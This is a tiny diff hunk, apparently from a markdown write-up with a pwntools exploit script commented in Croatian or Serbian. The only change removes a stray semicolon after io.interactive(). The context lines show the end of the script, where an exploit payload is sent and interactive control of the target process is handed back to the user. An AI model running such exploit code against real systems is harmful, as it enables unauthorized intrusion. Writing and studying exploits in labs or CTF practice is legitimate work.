@@ -93,7 +93,7 @@ payload += b"962"
 io.sendline(payload) #slanje exploita
 print(payload)
 
-io.interactive(); #prebacuje stdin i stdout na standardni ulaz i izlaz, vraća kontrolu korisniku (terminalu)
+io.interactive() #prebacuje stdin i stdout na standardni ulaz i izlaz, vraća kontrolu korisniku (terminalu)
 
 ```
 
